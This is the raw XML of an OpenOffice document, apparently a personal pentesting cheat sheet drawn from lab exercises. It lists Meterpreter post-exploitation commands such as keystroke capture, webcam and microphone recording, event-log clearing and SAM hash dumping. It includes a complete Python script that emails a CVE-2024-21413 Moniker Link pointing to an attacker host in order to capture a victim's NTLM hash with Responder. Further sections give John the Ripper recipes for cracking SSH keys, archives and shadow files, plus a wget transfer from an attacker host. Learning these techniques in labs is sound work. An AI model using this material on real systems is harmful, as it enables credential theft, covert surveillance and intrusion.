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2pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P6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7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Text_20_body">
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P9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italic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in" fo:margin-bottom="0in" fo:line-height="120%" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:line-height="120%" fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:line-height="120%" style:writing-mode="lr-tb"/>
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" style:writing-mode="lr-tb"/>
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P20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top="0in" fo:margin-bottom="0in" fo:line-height="120%" style:writing-mode="lr-tb"/>
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Arial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font-name="Arial1" fo:font-size="10pt" fo:font-style="normal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Arial1" fo:font-size="10pt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1" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="none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ize="10pt" fo:font-style="normal" style:text-underline-style="none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ize="10pt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fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T1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4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" style:font-name="Arial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ize-complex="12pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties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D BOOK</text:p>
      <text:p text:style-name="P3">Short examples for pentesting/hacking</text:p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bookmark text:name="docs-internal-guid-80e077b6-7fff-e2f0-251e-0943de18751a"/><text:span text:style-name="T3">METERPRETER COMMANDS</text:span></text:p>
            <text:p text:style-name="P11">Core commands</text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">background</text:span><text:span text:style-name="T4">: Backgrounds the current session</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">exit</text:span><text:span text:style-name="T4">: Terminate the Meterpreter session</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">guid</text:span><text:span text:style-name="T4">: Get the session GUID (Globally Unique Identifier)</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">help</text:span><text:span text:style-name="T4">: Displays the help menu</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">info</text:span><text:span text:style-name="T4">: Displays information about a Post module</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">irb</text:span><text:span text:style-name="T4">: Opens an interactive Ruby shell on the current session</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">load</text:span><text:span text:style-name="T4">: Loads one or more Meterpreter extensions</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">migrate</text:span><text:span text:style-name="T4">: Allows you to migrate Meterpreter to another process</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">run</text:span><text:span text:style-name="T4">: Executes a Meterpreter script or Post module</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">sessions</text:span><text:span text:style-name="T4">: Quickly switch to another session<text:line-break/><text:line-break/></text:span><text:span text:style-name="T2">File system commands</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">edit</text:span><text:span text:style-name="T4">: will allow you to edit a file</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">search</text:span><text:span text:style-name="T4">: Will search for files</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">upload</text:span><text:span text:style-name="T4">: Will upload a file or directory</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">download</text:span><text:span text:style-name="T4">: Will download a file or directory<text:line-break/><text:line-break/></text:span><text:span text:style-name="T2">Networking commands</text:span></text:p>
            <text:p text:style-name="P9">arp: Displays the host ARP (Address Resolution Protocol) cache</text:p>
            <text:p text:style-name="P9">ifconfig: Displays network interfaces available on the target system</text:p>
            <text:p text:style-name="P9">netstat: Displays the network connections</text:p>
            <text:p text:style-name="P9">portfwd: Forwards a local port to a remote service</text:p>
            <text:p text:style-name="P9">route: Allows you to view and modify the routing table</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P11">System commands</text:p>
            <text:p text:style-name="P9">clearev: Clears the event logs</text:p>
            <text:p text:style-name="P9">execute: Executes a command</text:p>
            <text:p text:style-name="P9">getpid: Shows the current process identifier</text:p>
            <text:p text:style-name="P9">getuid: Shows the user that Meterpreter is running as</text:p>
            <text:p text:style-name="P9">kill: Terminates a process</text:p>
            <text:p text:style-name="P9">pkill: Terminates processes by name</text:p>
            <text:p text:style-name="P9">ps: Lists running processes</text:p>
            <text:p text:style-name="P9">reboot: Reboots the remote computer</text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T4">: Drops into a system command shell like CMD/Powershell</text:span></text:p>
            <text:p text:style-name="P9"><text:soft-page-break/>shutdown: Shuts down the remote computer</text:p>
            <text:p text:style-name="P9">sysinfo: Gets information about the remote system, such as OS</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P18"><text:span text:style-name="T2">Others Commands</text:span><text:span text:style-name="T13"> </text:span><text:span text:style-name="T4">(these will be listed under different menu categories in the help menu)</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">idletime</text:span><text:span text:style-name="T4">: Returns the number of seconds the remote user has been idle</text:span></text:p>
            <text:p text:style-name="P9">keyscan_dump: Dumps the keystroke buffer</text:p>
            <text:p text:style-name="P9">keyscan_start: Starts capturing keystrokes</text:p>
            <text:p text:style-name="P9">keyscan_stop: Stops capturing keystrokes</text:p>
            <text:p text:style-name="P9">screenshare: Allows you to watch the remote user's desktop in real time</text:p>
            <text:p text:style-name="P9">screenshot: Grabs a screenshot of the interactive desktop</text:p>
            <text:p text:style-name="P9">record_mic: Records audio from the default microphone for X seconds</text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">webcam_chat</text:span><text:span text:style-name="T4">: Starts a video chat</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">webcam_list</text:span><text:span text:style-name="T4">: Lists webcams</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">webcam_snap</text:span><text:span text:style-name="T4">: Takes a snapshot from the specified webcam</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">webcam_stream</text:span><text:span text:style-name="T4">: Plays a video stream from the specified webcam</text:span></text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">getsystem</text:span><text:span text:style-name="T4">: Attempts to elevate your privilege to that of local system</text:span></text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T2">hashdump</text:span><text:span text:style-name="T5">: Dumps the contents of the SAM database</text:span> </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P7"><text:bookmark text:name="docs-internal-guid-8db46db7-7fff-9afa-d29e-460508373e25"/>MONKIER LINK (CVE-2024-21413)</text:p>
            <text:p text:style-name="P10">Send Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked. The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View.</text:p>
            <text:p text:style-name="P10">Example Monkier link in HTML code to send on target to click:</text:p>
            <text:p text:style-name="P12">&lt;a href="file://ATTACKER_IP/test!example"&gt;Click me&lt;/a&gt;.</text:p>
            <text:p text:style-name="P19"/>
            <text:p text:style-name="P12">Moniker link script for remote code execution, save as example.py</text:p>
            <text:p text:style-name="P14">'''</text:p>
            <text:p text:style-name="P14">Author: CMNatic | https://github.com/cmnatic</text:p>
            <text:p text:style-name="P14">Version: 1.0 | 19/02/2024</text:p>
            <text:p text:style-name="P14">'''</text:p>
            <text:p text:style-name="P14">import smtplib</text:p>
            <text:p text:style-name="P14">from email.mime.text import MIMEText</text:p>
            <text:p text:style-name="P14">from email.mime.multipart import MIMEMultipart</text:p>
            <text:p text:style-name="P14">from email.utils import formataddr</text:p>
            <text:p text:style-name="P14">sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address</text:p>
            <text:p text:style-name="P14">receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address</text:p>
            <text:p text:style-name="P14">password = input("Enter your attacker email password: ")</text:p>
            <text:p text:style-name="P14">html_content = """\</text:p>
            <text:p text:style-name="P14">&lt;!DOCTYPE html&gt;</text:p>
            <text:p text:style-name="P14"><text:soft-page-break/>&lt;html lang="en"&gt;</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!example"&gt;Click me&lt;/a&gt;&lt;/p&gt;</text:span></text:p>
            <text:p text:style-name="P19"/>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">&lt;/body&gt;</text:span></text:p>
            <text:p text:style-name="P14">&lt;/html&gt;"""</text:p>
            <text:p text:style-name="P14">message = MIMEMultipart()</text:p>
            <text:p text:style-name="P14">message['Subject'] = "CVE-2024-21413"</text:p>
            <text:p text:style-name="P14">message["From"] = formataddr(('CMNatic', sender_email))</text:p>
            <text:p text:style-name="P14">message["To"] = receiver_email</text:p>
            <text:p text:style-name="P14"># Convert the HTML string into bytes and attach it to the message object</text:p>
            <text:p text:style-name="P14">msgHtml = MIMEText(html_content,'html')</text:p>
            <text:p text:style-name="P14">message.attach(msgHtml)</text:p>
            <text:p text:style-name="P14">server = smtplib.SMTP('MAILSERVER', 25)</text:p>
            <text:p text:style-name="P14">server.ehlo()</text:p>
            <text:p text:style-name="P14">try:</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">server.login(sender_email, password)</text:span></text:p>
            <text:p text:style-name="P14">except Exception as err:</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">print(err)</text:span></text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">exit(-1)</text:span></text:p>
            <text:p text:style-name="P14">try:</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">server.sendmail(sender_email, [receiver_email], message.as_string())</text:span></text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">print("\n Email delivered")</text:span></text:p>
            <text:p text:style-name="P14">except Exception as error:</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">print(error)</text:span></text:p>
            <text:p text:style-name="P14">finally:</text:p>
            <text:p text:style-name="P15">    <text:span text:style-name="T16">server.quit()</text:span></text:p>
            <text:p text:style-name="P10"><text:line-break/>With responder tool listen on ens5 network interface:</text:p>
            <text:p text:style-name="P12">responder -I ens5</text:p>
            <text:p text:style-name="P17"><text:span text:style-name="T6">Run python </text:span><text:a xlink:type="simple" xlink:href="http://exploit.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">exploit.py</text:span></text:a><text:a xlink:type="simple" xlink:href="http://exploit.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T6"><text:line-break/></text:span></text:a><text:span text:style-name="T6">When target clicks link we will get info, NTLMv2 hash from responder window.</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P2">JOHN THE RIPPER<text:line-break/><text:line-break/>RAR2JOHN</text:p>
            <text:p text:style-name="P1">Brute force RAR <text:span text:style-name="T6">password protected file</text:span>.</text:p>
            <text:p text:style-name="P1">rar2john [rar file] &gt; [output file]</text:p>
            <text:p text:style-name="P1">First, extract the hash (password hash) from a RAR file:</text:p>
            <text:p text:style-name="P2">/opt/john/rar2john rarfile.rar &gt; rar_hash.txt</text:p>
            <text:p text:style-name="P1">Brute force file with rar hash:</text:p>
            <text:p text:style-name="P2">john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</text:p>
            <text:p text:style-name="P1">Unpack pa<text:span text:style-name="T15">ssword protected rar file and enter password found.</text:span></text:p>
            <text:p text:style-name="P5">unrar rarfile.rar</text:p>
            <text:p text:style-name="P5"><text:soft-page-break/></text:p>
            <text:p text:style-name="P6">SSH2john</text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T2">Crack the SSH private key from id_rsa and brute force hash to get password</text:span><text:span text:style-name="T4">. ssh2john converts the id_rsa private key, which is used to log in to the SSH session, into a hash format that John can work with.</text:span></text:p>
            <text:p text:style-name="P9">python3 /opt/john/ssh2john.py</text:p>
            <text:p text:style-name="P9">ssh2john [id_rsa private key file] &gt; [output file]</text:p>
            <text:p text:style-name="P9">/opt/john/<text:span text:style-name="T1">ssh2john.py FILE.id_rsa &gt; ssh_hash.txt</text:span></text:p>
            <text:p text:style-name="P9">john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P11">Zip2john</text:p>
            <text:p text:style-name="P9">Brute force ZIP password protected file. First create hash from zip file.<text:line-break/>zip2john SOMEZIP.zip &gt; ziphash.txt<text:line-break/>Brute force hash zip file for password.</text:p>
            <text:p text:style-name="P9">john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt</text:p>
            <text:p text:style-name="P9">john --show ziphash.txt</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P11">Custom rules John</text:p>
            <text:p text:style-name="P9">Custom passwords generator.<text:line-break/>In file: /opt/john/john.conf <text:s/>or /etc/john/john.conf <text:s/>create:</text:p>
            <text:p text:style-name="P9">[List.Rules:THMRules] is used to define the name of your rule</text:p>
            <text:p text:style-name="P9">Az: Takes the word and appends it with the characters you define</text:p>
            <text:p text:style-name="P9">A0: Takes the word and prepends it with the characters you define</text:p>
            <text:p text:style-name="P9">c: Capitalises the character positionally</text:p>
            <text:p text:style-name="P9">[0-9]: Will include numbers 0-9</text:p>
            <text:p text:style-name="P9">[0]: Will include only the number 0</text:p>
            <text:p text:style-name="P9">[A-z]: Will include both upper and lowercase</text:p>
            <text:p text:style-name="P9">[A-Z]: Will include only uppercase letters</text:p>
            <text:p text:style-name="P9">[a-z]: Will include only lowercase letters</text:p>
            <text:p text:style-name="P11">Example: [List.Rules:PoloPassword]</text:p>
            <text:p text:style-name="P9">cAz"[0-9] [!£$%@]"</text:p>
            <text:p text:style-name="P9">Utilises the following: c: Capitalises the first letter, Az: Appends to the end of the word, [0-9]: A number in the range 0-9</text:p>
            <text:p text:style-name="P9">[!£$%@]: The password is followed by one of these symbols. <text:line-break/>We cand then call this custom rule with argument using the --rule=PoloPassword flag.</text:p>
            <text:p text:style-name="P13">john --wordlist=[path to wordlist] --rule=PoloPassword [path to hashfile]</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P11">UNHASH ROOT USER SHADOW FILE WITH JOHN</text:p>
            <text:p text:style-name="P9">Unshadow /etc/passwd /etc/shadow &gt; passfile.txt</text:p>
            <text:p text:style-name="P9">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passfile.txt</text:p>
            <text:p text:style-name="P9"><text:soft-page-break/>John --show passfile.txt</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P11">JOHN THE RIPPER - CRACK HASH</text:p>
            <text:p text:style-name="P18"><text:span text:style-name="T4">john --wordlist=[path to wordlist] --format=[format] [path to hashfile]<text:line-break/>Use hash identifier to check for hash format:<text:line-break/></text:span><text:a xlink:type="simple" xlink:href="https://hashes.com/en/tools/hash_identifier" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://hashes.com/en/tools/hash_identifier</text:a><text:span text:style-name="T4"><text:line-break/>Python hash identifier:</text:span></text:p>
            <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master</text:a> </text:p>
            <text:p text:style-name="P16"><text:span text:style-name="T6">Launch hash identifier: python3 </text:span><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">hash-id.py</text:span></text:a><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T6"><text:line-break/></text:span></text:a><text:span text:style-name="T6">Search for John formats - check hash formats for md5:</text:span></text:p>
            <text:p text:style-name="P9">john --list=formats | grep -iF "md5"</text:p>
            <text:p text:style-name="P9">Example full command:</text:p>
            <text:p text:style-name="P13">john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt</text:p>
            <text:p text:style-name="P9">Check cracked hash:</text:p>
            <text:p text:style-name="P13">Cat /home/user/src/john/run/john.pot</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P2">GOBUSTER CRAWLER BRUTE FORCE SEARCH WEBPAGES</text:p>
            <text:p text:style-name="P1">Using wordlist, search for directories on webserver to detect what pages webserver have.</text:p>
            <text:p text:style-name="P2">gobuster -u http://WEBPAGE -w WORDLIST.txt dir</text:p>
            <text:p text:style-name="P1">-u is used to state the website we're scanning</text:p>
            <text:p text:style-name="P1">-w takes a list of words to iterate through to find hidden pages</text:p>
            <text:p text:style-name="P1">-dir search for directories</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P2">TRANSFER FILES USING HTTP</text:p>
            <text:p text:style-name="P1">Start http server with Python (Win) and download files on target with wget request.</text:p>
            <text:p text:style-name="P1">On attacker (win):</text:p>
            <text:p text:style-name="P2">python3 -m http.server 1234 c:/testdir</text:p>
            <text:p text:style-name="P1">-1234 is port where http server will listen, and in last part is directory for http server (not required). For Linux, you could use<text:span text:style-name="T1"> python -m SimpleHTTPServer PORT</text:span></text:p>
            <text:p text:style-name="P1">On target in CMD (win/linux/any):</text:p>
            <text:p text:style-name="P2">wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR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or </meta:initial-creator>
    <meta:creation-date>2025-07-13T19:54:24.08</meta:creation-date>
    <dc:date>2025-07-26T12:03:33.53</dc:date>
    <dc:creator>Davor </dc:creator>
    <meta:editing-duration>PT22M2S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.15$Win32 OpenOffice.org_project/4115m2$Build-9813</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="156" meta:word-count="1047" meta:character-count="7508"/>
  </office:meta>
</office:document-meta>
</file>